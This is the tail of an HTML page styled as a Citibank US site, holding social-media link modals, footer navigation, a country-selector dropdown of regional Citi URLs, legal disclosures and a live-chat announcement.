                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ytb-c197="" class="ng-star-inserted">
                                                    <button _ngcontent-ytb-c197="" data-target="#modal21" aria-label="twitter" class="citi-branding-assets/images/social-media_twitter@3x.png ng-star-inserted">
                                                        <div _ngcontent-ytb-c197="" class="twitter"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal21">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <spannn _ngcontent-ytb-c197="">
                                                                                        <p>
                                                                                            You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less
                                                                                            security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you
                                                                                            want to go to the third party site?
                                                                                        </p>
                                                                                        <p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p>
                                                                                    </spannn>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <a
                                                                                            _ngcontent-ytb-c46=""
                                                                                            target="_blank"
                                                                                            id="d931f9a9-2979-8940-0b42-8b6a36a2f058"
                                                                                            href="https://twitter.com/Citibank/"
                                                                                            aria-describedby="becac3b7-6031-5dfb-8a00-706f0dd3d885_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="becac3b7-6031-5dfb-8a00-706f0dd3d885_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ytb-c197="" class="ng-star-inserted">
                                                    <button _ngcontent-ytb-c197="" data-target="#modal22" aria-label="youtube" class="citi-branding-assets/images/social-media_youtube@3x.png ng-star-inserted">
                                                        <div _ngcontent-ytb-c197="" class="youtube"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal22">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <spannn _ngcontent-ytb-c197="">
                                                                                        <p>
                                                                                            You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less
                                                                                            security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you
                                                                                            want to go to the third party site?
                                                                                        </p>
                                                                                        <p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p>
                                                                                    </spannn>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <a
                                                                                            _ngcontent-ytb-c46=""
                                                                                            target="_blank"
                                                                                            id="74f446e9-a20c-46ab-e9eb-728a4f2cb2c7"
                                                                                            href="https://www.youtube.com/citi"
                                                                                            aria-describedby="ba9666b8-ed01-f591-e42d-d222a5e53408_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="ba9666b8-ed01-f591-e42d-d222a5e53408_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </citi-social-media>
                                <citi-footer-sub-navigation _ngcontent-ytb-c193="" _nghost-ytb-c195="">
                                    <div _ngcontent-ytb-c195="" class="sub-navigation ng-star-inserted">
                                        <div _ngcontent-ytb-c195="" class="content">
                                            <p _ngcontent-ytb-c195="" class="copyright ng-star-inserted">© 2021 Citigroup Inc</p>
                                            <ul _ngcontent-ytb-c195="" class="ng-star-inserted">
                                                <li _ngcontent-ytb-c195="" id="subnavTermsConditions" class="ng-star-inserted">
                                                    <citi-cta _ngcontent-ytb-c195="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                        <a
                                                            _ngcontent-ytb-c46=""
                                                            id="b656e3c4-ab03-89f2-e2ef-a26798ac895f"
                                                            data-target="#modalId"
                                                            class="btn btn-link ng-star-inserted"
                                                            href="https://online.citi.com/US/ag/termsdisclaimer/termsdisclaimerhome"
                                                        >
                                                            Terms &amp; Conditions
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ytb-c195="" id="subnavPrivacy" class="ng-star-inserted">
                                                    <citi-cta _ngcontent-ytb-c195="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                        <a
                                                            _ngcontent-ytb-c46=""
                                                            target="_self"
                                                            id="6ba8c3d3-2730-85d4-1e77-e38f5d1834f1"
                                                            href="https://online.citi.com/US/JRS/portal/template.do?ID=Privacy"
                                                            data-target="#modalId"
                                                            class="btn btn-link ng-star-inserted"
                                                        >
                                                            Privacy
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ytb-c195="" id="subnavNoticeAtCollection" class="ng-star-inserted">
                                                    <citi-cta _ngcontent-ytb-c195="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                        <a
                                                            _ngcontent-ytb-c46=""
                                                            target="_self"
                                                            id="34c6595c-bee5-3338-c4f3-52c56a123b6c"
                                                            href="https://online.citi.com/JRS/portal/template.do?ID=Privacy#notice-at-collection"
                                                            data-target="#modalId"
                                                            class="btn btn-link ng-star-inserted"
                                                        >
                                                            Notice at Collection
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ytb-c195="" id="subnavPrivacyHub" class="ng-star-inserted">
                                                    <citi-cta _ngcontent-ytb-c195="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                        <a _ngcontent-ytb-c46="" id="fc65fd75-21f3-de04-af71-83c474580bcf" data-target="#modalId" class="btn btn-link ng-star-inserted" href="https://online.citi.com/US/ag/dataprivacyhub">
                                                            CA Privacy Hub
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ytb-c195="" id="subnavAccessibility" class="ng-star-inserted">
                                                    <citi-cta _ngcontent-ytb-c195="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                        <a
                                                            _ngcontent-ytb-c46=""
                                                            target="_self"
                                                            id="117e7cc6-025e-ba18-8650-470d1e28a056"
                                                            href="https://online.citi.com/US/JRS/portal/template.do?ID=Accessibility"
                                                            data-target="#modalId"
                                                            class="btn btn-link ng-star-inserted"
                                                        >
                                                            Accessibility
                                                        </a>
                                                    </citi-cta>
                                                </li>
                                                <li _ngcontent-ytb-c195="" id="" class="ng-star-inserted"><span _ngcontent-ytb-c195="" class="staticLinks ng-star-inserted">Country &amp; Jurisdictions:</span></li>
                                                <li _ngcontent-ytb-c195="" id="" class="ng-star-inserted">
                                                    <citi-cta _ngcontent-ytb-c195="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                        <button _ngcontent-ytb-c46="" style="text-align: center;" type="button" id="124c97c7-4162-6bc1-9839-f28512c0fb55" data-target="#modalId" class="btn btn-link ng-star-inserted">
                                                            <b>United States</b>
                                                        </button>
                                                    </citi-cta>
                                                    <span _ngcontent-ytb-c195="" class="staticLinks ng-star-inserted" style="font-weight: bold;"> &gt; </span>
                                                    <citi-modal _ngcontent-ytb-c195="" showcancelbutton="true" cancelbuttontext="Cancel" idstr="unitedStates" class="cbolui-ddl-pre ng-star-inserted" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="unitedStates">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <div _ngcontent-ytb-c195="" class="theme-light">
                                                                                        <p _ngcontent-ytb-c195=""></p>
                                                                                        <p _ngcontent-ytb-c195="" class="speedBumpCopy">Get Citibank information on the countries &amp; jurisdictions we serve</p>
                                                                                        <span _ngcontent-ytb-c195="" class="selectCountry">Select Country or Jurisdiction</span>
                                                                                        <citi-dropdown _ngcontent-ytb-c195="" idstr="countrySelect" class="citi-dropdown row" _nghost-ytb-c87="">
                                                                                            <div _ngcontent-ytb-c87="" class="dd-wrapper ng-star-inserted form-group col-xs-12 has-value">
                                                                                                <label _ngcontent-ytb-c87="" class="select-box-label" id="countrySelectlabel" for="countrySelect"></label>
                                                                                                <div _ngcontent-ytb-c87="">
                                                                                                    <select
                                                                                                        _ngcontent-ytb-c87=""
                                                                                                        class="form-control ng-untouched ng-pristine ng-valid"
                                                                                                        id="countrySelect"
                                                                                                        aria-labelledby="countrySelectlabel"
                                                                                                    >
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.au/portal/citiau_home.htm" class="ng-star-inserted">Australia</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="https://www.citibank.com/bahrain" class="ng-star-inserted">Bahrain</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="https://www.citibank.com.br/BRGCB/JPS/portal/Index.do" class="ng-star-inserted">Brazil</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.cn/homepage/cn/cn_homepage.htm" class="ng-star-inserted">
                                                                                                            China - Chinese
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.cn/homepage/en/cn_homepage.htm" class="ng-star-inserted">
                                                                                                            China - English
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="https://www.citibank.com.co/COGCB/JPS/portal/Index.do" class="ng-star-inserted">Colombia</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citi.com.sv/" class="ng-star-inserted">El Salvador</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citi.com/citi/about/countrypresence/guatemala.html" class="ng-star-inserted">
                                                                                                            Guatemala
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.hk/" class="ng-star-inserted">Hong Kong</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.online.citibank.co.in/" class="ng-star-inserted">India - Domestic</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.online.citibank.co.in/citi-nri.htm" class="ng-star-inserted">
                                                                                                            India - Non-Resident Indian (NRI)
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="https://www.citibank.co.id/portal/bahasa_home/index.htm" class="ng-star-inserted">
                                                                                                            Indonesia - Bahasa Indonesia
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.co.id/" class="ng-star-inserted">Indonesia - English</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.co.kr/" class="ng-star-inserted">Korea - Korean</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="https://www.citibank.co.kr/ComMainCnts0100_en.act?JEX_LANG=EN" class="ng-star-inserted">
                                                                                                            Korea - English
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.my/" class="ng-star-inserted">Malaysia</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citi.com/citi/about/countrypresence/mexico.html" class="ng-star-inserted">
                                                                                                            Mexico
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.ph/portal/citiph_home.htm" class="ng-star-inserted">Philippines</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.pl/poland/homepage/polish/index.htm" class="ng-star-inserted">Poland</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.ru/russia/main/rus/home.htm" class="ng-star-inserted">Russia - Russian</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.ru/russia/main/eng/home.htm" class="ng-star-inserted">Russia - English</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.sg/" class="ng-star-inserted">Singapore</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.tw/portal/home_chinese/twcb_Home.htm" class="ng-star-inserted">
                                                                                                            Taiwan - Chinese
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.tw/portal/home_english/twcb_Home.htm" class="ng-star-inserted">
                                                                                                            Taiwan - English
                                                                                                        </option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.co.th/" class="ng-star-inserted">Thailand</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citi.com/uae/homepage/index.htm" class="ng-star-inserted">United Arab Emirates</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.co.uk/index.htm" class="ng-star-inserted">United Kingdom</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citi.com/domain/home.htm" class="ng-star-inserted">United States</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="https://www.citibank.com.ve/VEGCB/JPS/portal/Index.do" class="ng-star-inserted">Venezuela</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.vn/" class="ng-star-inserted">Vietnam - Vietnamese</option>
                                                                                                        <option _ngcontent-ytb-c87="" value="http://www.citibank.com.vn/portal/vietnam_home.htm" class="ng-star-inserted">
                                                                                                            Vietnam - English
                                                                                                        </option>
                                                                                                    </select>
                                                                                                </div>
                                                                                            </div>
                                                                                        </citi-dropdown>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <button
                                                                                            _ngcontent-ytb-c46=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="a60f5372-284d-8780-d35a-1214b216d4d9"
                                                                                            role="button"
                                                                                            aria-describedby="2d87198f-ce02-52a6-7bec-248f0b93539f_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Submit
                                                                                        </button>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="2d87198f-ce02-52a6-7bec-248f0b93539f_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                    <citi-cta _ngcontent-ytb-c53="" ariarole="button" type="tertiary" class="modal-secondary-btn marginBetweenBtns ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <button
                                                                                            _ngcontent-ytb-c46=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="f29bbfcb-f4f5-7ee6-4726-92e430bc5bd5"
                                                                                            role="button"
                                                                                            class="btn btn-link ng-star-inserted"
                                                                                        >
                                                                                            Cancel
                                                                                        </button>
                                                                                    </citi-cta>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </citi-footer-sub-navigation>
                                <citi-footer-disclaimer _ngcontent-ytb-c193="" _nghost-ytb-c196="">
                                    <div _ngcontent-ytb-c196="" class="disclaimer ng-star-inserted">
                                        <div _ngcontent-ytb-c196="" class="content">
                                            <div _ngcontent-ytb-c196="" class="text">
                                                <p><strong>Important Legal Disclosures &amp; Information</strong></p>
                                                <p>
                                                    Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It does not,
                                                    and should not be construed as, an offer, invitation or solicitation of services to individuals outside of the United States.
                                                </p>
                                                <p>
                                                    Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all accounts, products, and services as well as pricing described here are available in
                                                    all jurisdictions or to all customers. Your eligibility for a particular product and service is subject to a final determination by Citibank. Your country of citizenship, domicile, or
                                                    residence, if other than the United States, may have laws, rules, and regulations that govern or affect your application for and use of our accounts, products and services, including laws
                                                    and regulations regarding taxes, exchange and/or capital controls that you are responsible for following.
                                                </p>
                                                <p>
                                                    The products, account packages, promotional offers and services described in this website may not apply to customers of
                                                    <a target="_blank" href="https://online.citi.com/JRS/portal/template.do?ID=international-personal-bank&amp;l=en&amp;locale=en_US">International Personal Bank U.S.</a> in the Citigold
                                                    <sup>®</sup> Private Client International, Citigold<sup>®</sup> International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account Packages.
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                </citi-footer-disclaimer>
                                <citi-sub-footer _ngcontent-ytb-c193="" _nghost-ytb-c198="">
                                    <div _ngcontent-ytb-c198="" class="sub-footer ng-star-inserted">
                                        <div _ngcontent-ytb-c198="" class="content"></div>
                                        <div _ngcontent-ytb-c198="">
                                            <img _ngcontent-ytb-c198="" src="si_assetz/img/320_Citi-PLT3x.png" alt="Citi Banner" aria-label="Citi Banner" class="imgBottomCitiLogo_Mobile" />
                                            <img _ngcontent-ytb-c198="" src="si_assetz/img/1440_Citi-PLT3x.png" alt="Citi Banner" aria-label="Citi Banner" class="imgBottomCitiLogo_Desktop" />
                                        </div>
                                    </div>
                                </citi-sub-footer>
                            </div>
                        </citi-footer>
                    </div>
                </citi-parent-layout>
            </cbol-core>
            <livechat _ngcontent-ytb-c269="" _nghost-ytb-c268="">
                <div _ngcontent-ytb-c268="" class="citi-outer-container cbolui-responsive cbolui-ddl-post">
                    <div _ngcontent-ytb-c268="" id="lpButtonDiv"></div>
                    <citi-modal _ngcontent-ytb-c268="" idstr="livechat-campaign" closebuttonidstr="modalCloseBtn1" _nghost-ytb-c53="" class="ng-star-inserted">
                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="livechat-campaign">
                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted"><span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span></button>
                                        </div>
                                        <div _ngcontent-ytb-c53="" role="document">
                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="ng-star-inserted">
                                                    <citi-text-header _ngcontent-ytb-c53="" level="2" tabindex="-1" _nghost-ytb-c54="">
                                                        
                                                        <h2 _ngcontent-ytb-c54="" class="header-level-2 ng-star-inserted">What's New</h2>
                                                    </citi-text-header>
                                                </div>
                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                    <citi-row _ngcontent-ytb-c268="">
                                                        <div class="row">
                                                            <citi-column _ngcontent-ytb-c268="" md="6" lg="6" sm="12">
                                                                <div class="col-md-6 col-lg-6 col-sm-12">
                                                                    <div _ngcontent-ytb-c268="" class="campaign-title">Chat Has a New Home</div>
                                                                    <div _ngcontent-ytb-c268="" class="campaign-body">
                                                                        Come visit us at our new, easy-to-find location! Just open Search &amp; Help and select the Chat symbol anytime you want to chat.
                                                                    </div>
                                                                </div>
                                                            </citi-column>
                                                            <citi-column _ngcontent-ytb-c268="" md="6" lg="6" sm="12">
                                                                <div class="col-md-6 col-lg-6 col-sm-12">
                                                                    <img _ngcontent-ytb-c268="" src="si_assetz/img/chat_search_campaign.png" class="campaign_image" alt="Chat Has a New Home" title="Chat Has a New Home" />
                                                                </div>
                                                            </citi-column>
                                                        </div>
                                                    </citi-row>
                                                    <citi-row _ngcontent-ytb-c268="">
                                                        <div class="row">
                                                            <citi-column _ngcontent-ytb-c268="" md="6" lg="6" sm="12">
                                                                <div class="col-md-6 col-lg-6 col-sm-12">
                                                                    <citi-cta _ngcontent-ytb-c268="" _nghost-ytb-c46="">
                                                                        <button _ngcontent-ytb-c46="" style="text-align: center;" type="button" id="35bbaf04-bd03-84c5-dd11-d313c2d6d271" class="btn btn-primary ng-star-inserted">
                                                                            Got it, Thanks
                                                                        </button>
                                                                    </citi-cta>
                                                                </div>
                                                            </citi-column>
                                                        </div>
                                                    </citi-row>
                                                </div>
                                            </div>
                                        </div>
                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                            <div _ngcontent-ytb-c53="" class="ng-star-inserted"><div _ngcontent-ytb-c53=""></div></div>
                                        </div>
                                    </div>
                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                </div>
                            </div>
                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                        </div>
                    </citi-modal>
                </div>
            </livechat>
        </app-root>
        <div class="sr-only" aria-atomic="true" aria-live="polite"></div>
        <div id="chatDiv">
            <style>
                @media print {
                    #lpButtonDiv {
                        display: none;
                    }
                }
            </style>
        </div>
    </body>
</html>